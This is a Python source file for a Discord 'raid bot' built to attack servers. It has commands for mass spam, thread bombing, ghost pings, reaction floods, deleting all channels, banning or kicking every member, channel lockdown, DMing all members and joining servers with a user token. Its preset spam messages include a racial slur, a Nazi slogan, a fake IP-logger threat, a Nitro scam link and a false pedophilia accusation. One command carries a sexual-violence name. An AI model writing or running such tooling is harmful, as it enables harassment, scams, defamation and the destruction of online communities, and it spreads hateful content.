import os
import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
import raider

load_dotenv()

# ── health server ──────────────────────────────────────────────────────────────
_PORT = int(os.environ.get("PORT", "8080"))

class _H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ("/", "/health"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, *_):
        pass

_srv = ThreadingHTTPServer(("0.0.0.0", _PORT), _H)
threading.Thread(target=_srv.serve_forever, daemon=True).start()
print(f"[health] :{_PORT} ready", flush=True)

# ── config ─────────────────────────────────────────────────────────────────────
TOKEN         = os.environ.get("BOT_TOKEN") or os.environ.get("DISCORD_TOKEN") or ""
CLIENT_ID     = os.environ.get("CLIENT_ID", "")
HOME_GUILD    = os.environ.get("HOME_GUILD", "")
DEFAULT_GUILD = os.environ.get("TARGET_GUILD", "")

intents = discord.Intents.all()
bot     = commands.Bot(command_prefix="!", intents=intents)
tree    = bot.tree

# ── preset messages ────────────────────────────────────────────────────────────
# Type 1-6 in the modal message field to use a preset.
# {ip} is expanded per-send in raider._resolve_message()
PRESETS: dict[str, str] = {
    "1": "@everyone this server is being DELETED",
    "2": "nigger",
    "3": "@everyone heil hitler this server is done",
    "4": "@everyone your IP has been logged: {ip}",
    "5": "@everyone FREE NITRO discord.gift/xXxXxXxX",
    "6": "@everyone the owner is a pedophile get out now",
}

PRESET_HINT = (
    "1 → server deleted  |  2 → slur  |  3 → nazi  |"
    "  4 → fake IP logger  |  5 → nitro scam  |  6 → owner expose"
)

def resolve_preset(raw: str) -> str:
    """Return preset string if raw is '1'–'6', else raw as-is."""
    return PRESETS.get(raw.strip(), raw.strip()) or "@everyone"

# ── guild resolver ─────────────────────────────────────────────────────────────
def resolve(interaction: discord.Interaction, guild_id: str = "") -> discord.Guild | None:
    gid = guild_id.strip() or DEFAULT_GUILD
    if gid:
        g = bot.get_guild(int(gid))
        if g:
            return g
    return interaction.guild

# ── startup sync ───────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    if HOME_GUILD:
        try:
            cmds = await tree.sync(guild=discord.Object(id=int(HOME_GUILD)))
            print(f"[sync] HOME_GUILD {HOME_GUILD} — {len(cmds)} commands", flush=True)
            others = [g for g in bot.guilds if g.id != int(HOME_GUILD)]
        except Exception as e:
            print(f"[sync] HOME_GUILD failed: {e}", flush=True)
            others = list(bot.guilds)
    else:
        others = list(bot.guilds)

    if others:
        results = await asyncio.gather(
            *[tree.sync(guild=discord.Object(id=g.id)) for g in others],
            return_exceptions=True,
        )
        ok = sum(1 for r in results if not isinstance(r, Exception))
        print(f"[sync] {ok}/{len(others)} guilds synced", flush=True)

    await tree.sync()
    print(f"[raid-bot] ready — {bot.user} — {len(bot.guilds)} guild(s)", flush=True)
    await bot.change_presence(activity=discord.Game("/help"))

@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        await tree.sync(guild=discord.Object(id=guild.id))
        print(f"[sync] joined {guild.name} ({guild.id})", flush=True)
    except Exception as e:
        print(f"[sync] failed {guild.id}: {e}", flush=True)

# ─────────────────────────────────────────────────────────────────────────────
# /raid  MODAL
# ─────────────────────────────────────────────────────────────────────────────

class RaidModal(discord.ui.Modal, title="Raid Config"):
    message = discord.ui.TextInput(
        label="Spam message (or type 1-6 for preset)",
        placeholder=PRESET_HINT,
        max_length=1900,
    )
    times = discord.ui.TextInput(
        label="Count per channel (1-999)",
        placeholder="50",
        max_length=3,
        default="50",
    )
    delay = discord.ui.TextInput(
        label="Delay between messages in seconds (0 = none)",
        placeholder="0",
        max_length=5,
        required=False,
        default="0",
    )
    guild_id = discord.ui.TextInput(
        label="Target guild ID (blank = current server)",
        placeholder="123456789012345678",
        required=False,
        max_length=20,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        try:
            n = max(1, min(int(self.times.value.strip()), 999))
        except ValueError:
            return await interaction.followup.send("count must be a number 1-999", ephemeral=True)

        try:
            d = max(0.0, float(self.delay.value.strip() or "0"))
        except ValueError:
            d = 0.0

        msg = resolve_preset(self.message.value)

        g = resolve(interaction, self.guild_id.value.strip())
        if not g:
            return await interaction.followup.send(
                "guild not found — bot must be a member first (use /invite → add to server)\n"
                "if user-installed, pass the guild ID in the field above",
                ephemeral=True,
            )

        await interaction.followup.send(
            f"raiding `{g.name}` — `{msg[:80]}{'…' if len(msg) > 80 else ''}` ×{n}"
            f"{f' (delay {d}s)' if d else ''}...",
            ephemeral=True,
        )
        await raider.spam_channels(g, msg, n, d)

@tree.command(name="raid", description="Open raid form — preset or custom message, up to 999×")
async def slash_raid(interaction: discord.Interaction):
    await interaction.response.send_modal(RaidModal())

# ─────────────────────────────────────────────────────────────────────────────
# NO-ADMIN OPS  — send_messages + low perms only
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="thread", description="Thread bomb: create + spam threads in every channel (no admin needed)")
@app_commands.describe(
    guild_id="Target guild ID (blank = current server)",
    message="Message to spam in each thread",
    threads="Threads per channel (default 10)",
    spam="Messages per thread (default 20)",
)
async def slash_thread(
    interaction: discord.Interaction,
    guild_id: str = "",
    message: str = "@everyone",
    threads: int = 10,
    spam: int = 20,
):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send(
            "guild not found — pass guild_id if running as user-install app", ephemeral=True
        )
    await interaction.followup.send(
        f"thread bombing `{g.name}` — {threads} threads/channel, {spam} msgs/thread...",
        ephemeral=True,
    )
    await raider.thread_bomb(g, message, threads, spam)


@tree.command(name="ghost", description="Ghost ping loop: mass ping → instant delete → repeat (no admin needed)")
@app_commands.describe(
    guild_id="Target guild ID (blank = current server)",
    times="Ping-delete cycles per channel (default 50)",
)
async def slash_ghost(
    interaction: discord.Interaction,
    guild_id: str = "",
    times: int = 50,
):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send(
            "guild not found — pass guild_id if running as user-install app", ephemeral=True
        )
    await interaction.followup.send(
        f"ghost pinging `{g.name}` — {times} cycles per channel...",
        ephemeral=True,
    )
    await raider.ghost_ping(g, times)


@tree.command(name="react", description="Reaction flood: spam reactions on every recent message (no admin needed)")
@app_commands.describe(
    guild_id="Target guild ID (blank = current server)",
    emoji="Emoji to spam (default 💀)",
    limit="Recent messages per channel to react to (default 50)",
)
async def slash_react(
    interaction: discord.Interaction,
    guild_id: str = "",
    emoji: str = "💀",
    limit: int = 50,
):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send(
            "guild not found — pass guild_id if running as user-install app", ephemeral=True
        )
    await interaction.followup.send(
        f"reaction flooding `{g.name}` — {emoji} on last {limit} msgs/channel...",
        ephemeral=True,
    )
    await raider.react_flood(g, emoji, limit)

# ─────────────────────────────────────────────────────────────────────────────
# SETUP COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="invite", description="Get invite links — admin (full raid) + low-perm (no-admin ops)")
async def slash_invite(interaction: discord.Interaction):
    cid = CLIENT_ID or str(bot.user.id)

    # admin link — full capabilities
    perms_admin = discord.Permissions(administrator=True)
    admin_link  = discord.utils.oauth_url(int(cid), permissions=perms_admin)

    # low-perm link — /raid /ghost /react /thread only, no admin needed
    perms_low = discord.Permissions(
        view_channel=True,
        send_messages=True,
        send_messages_in_threads=True,
        create_public_threads=True,
        add_reactions=True,
        read_message_history=True,
        attach_files=True,
        embed_links=True,
    )
    low_link = discord.utils.oauth_url(int(cid), permissions=perms_low)

    # user-install link — /test and /raid (with guild_id) from any server
    user_link = (
        f"https://discord.com/oauth2/authorize?client_id={cid}"
        f"&integration_type=1&scope=applications.commands"
    )

    await interaction.response.send_message(
        "**add to server — full admin** (nuke / ban / kick / lock):\n"
        f"{admin_link}\n\n"
        "**add to server — low perms** (/raid /ghost /react /thread — no admin invite needed):\n"
        f"{low_link}\n\n"
        "**add to apps** (/test + /raid with guild_id from any server you're in):\n"
        f"{user_link}",
        ephemeral=True,
    )


@tree.command(name="test", description="Probe raidability — works as user-installed app (pass guild_id)")
@app_commands.describe(guild_id="Target guild ID (required if using as user-install app)")
async def slash_test(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        # user-install context with no guild
        if not guild_id:
            return await interaction.followup.send(
                "running as user-install app with no server context.\n"
                "pass `guild_id` to probe a specific server the bot is in.\n"
                "use `/servers` to see what servers the bot is currently in.",
                ephemeral=True,
            )
        return await interaction.followup.send(
            "guild not found — bot must be a member of that server first.\n"
            "use /invite → add to server, then /test again with the guild_id.",
            ephemeral=True,
        )
    report = await raider.probe_guild(g)
    await interaction.followup.send(report, ephemeral=True)


@tree.command(name="servers", description="List all servers the bot is in")
async def slash_servers(interaction: discord.Interaction):
    if not bot.guilds:
        return await interaction.response.send_message("not in any server", ephemeral=True)
    lines = [f"`{g.id}` | **{g.name}** | {g.member_count} members" for g in bot.guilds]
    out   = "\n".join(lines)
    if len(out) > 1900:
        out = out[:1900] + "\n…"
    await interaction.response.send_message(out, ephemeral=True)


@tree.command(name="join", description="Join a server via invite using a user token")
@app_commands.describe(invite="Invite code or URL", user_token="User token (or set USER_TOKEN env)")
async def slash_join(interaction: discord.Interaction, invite: str, user_token: str = ""):
    await interaction.response.defer(ephemeral=True)
    tok = user_token or os.environ.get("USER_TOKEN", "")
    if not tok:
        return await interaction.followup.send(
            "no user token — pass inline or set USER_TOKEN env", ephemeral=True
        )
    result = await raider.join_server(invite.split("/")[-1].strip(), tok)
    await interaction.followup.send(result, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# ADMIN RAID COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="nuke", description="Delete all channels, flood with N spam channels")
@app_commands.describe(guild_id="Target guild ID", name="Channel name", count="Channels to create")
async def slash_nuke(
    interaction: discord.Interaction,
    guild_id: str = "",
    name: str = "nuked",
    count: int = 50,
):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"nuking `{g.name}`...", ephemeral=True)
    await raider.nuke_guild(g, name, count)


@tree.command(name="dmall", description="DM every member in the server")
@app_commands.describe(message="Message to DM", limit="Max members (0 = all)")
async def slash_dmall(
    interaction: discord.Interaction,
    message: str = "you got raided",
    limit: int = 0,
):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)
    count = await raider.dm_members(g, message, limit)
    await interaction.followup.send(f"DMed {count} members", ephemeral=True)


@tree.command(name="banall", description="Ban all non-owner members")
@app_commands.describe(guild_id="Target guild ID")
async def slash_banall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"banning all in `{g.name}`...", ephemeral=True)
    await raider.ban_all(g)


@tree.command(name="kickall", description="Kick all non-owner members")
@app_commands.describe(guild_id="Target guild ID")
async def slash_kickall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"kicking all in `{g.name}`...", ephemeral=True)
    await raider.kick_all(g)


@tree.command(name="lockdown", description="Deny @everyone send/read on every channel")
@app_commands.describe(guild_id="Target guild ID")
async def slash_lockdown(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    count = await raider.lockdown_channels(g)
    await interaction.followup.send(f"locked {count} channels", ephemeral=True)


@tree.command(name="fullrape", description="Full sequence: delete roles → nuke channels → @everyone spam")
@app_commands.describe(guild_id="Target guild ID")
async def slash_fullrape(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"running on `{g.name}`...", ephemeral=True)
    await raider.delete_roles(g)
    await raider.nuke_guild(g, "raided", 50)
    await raider.mention_spam(g, 20)

# ─────────────────────────────────────────────────────────────────────────────
# HELP
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="help", description="Show all commands")
async def slash_help(interaction: discord.Interaction):
    msg = (
        "**commands** (your responses are ephemeral — raid damage is public)\n\n"
        "**setup**\n"
        "`/invite`                   — admin + low-perm + user-install links\n"
        "`/servers`                  — list servers bot is in\n"
        "`/join <invite> [token]`    — join server via user token\n"
        "`/test [guild_id]`          — raidability probe (works user-installed)\n\n"
        "**no-admin ops** (send_messages / add_reactions / create_public_threads)\n"
        "`/raid`                     — modal: preset 1-6 or custom, 1-999×, delay, guild_id\n"
        "  presets: 1=deleted 2=slur 3=nazi 4=fake-ip 5=nitro-scam 6=expose-owner\n"
        "`/thread [id] [msg] [n] [s]`— thread bomb every channel (n threads, s msgs each)\n"
        "`/ghost  [id] [times]`      — ghost ping loop: ping→delete→repeat per channel\n"
        "`/react  [id] [emoji] [n]`  — react flood: hit last n msgs in every channel\n\n"
        "**admin ops** (needs manage_channels / ban / kick etc.)\n"
        "`/nuke   [id] [name] [n]`   — delete all channels, create n spam channels\n"
        "`/dmall  [limit] [msg]`     — DM all members\n"
        "`/banall [id]`              — ban everyone\n"
        "`/kickall [id]`             — kick everyone\n"
        "`/lockdown [id]`            — deny @everyone everywhere\n"
        "`/fullrape [id]`            — roles → nuke → @everyone spam\n"
    )
    await interaction.response.send_message(msg, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# ENTRYPOINT
# ─────────────────────────────────────────────────────────────────────────────

async def main():
    if not TOKEN:
        print(
            "[bot] no token — set BOT_TOKEN or DISCORD_TOKEN in Railway → Variables",
            flush=True,
        )
        await asyncio.Event().wait()
        return
    try:
        await bot.start(TOKEN)
    except discord.LoginFailure:
        print("[bot] LoginFailure — token invalid or revoked", flush=True)
        await asyncio.Event().wait()
    except Exception as e:
        print(f"[bot] crashed: {type(e).__name__}: {e}", flush=True)
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
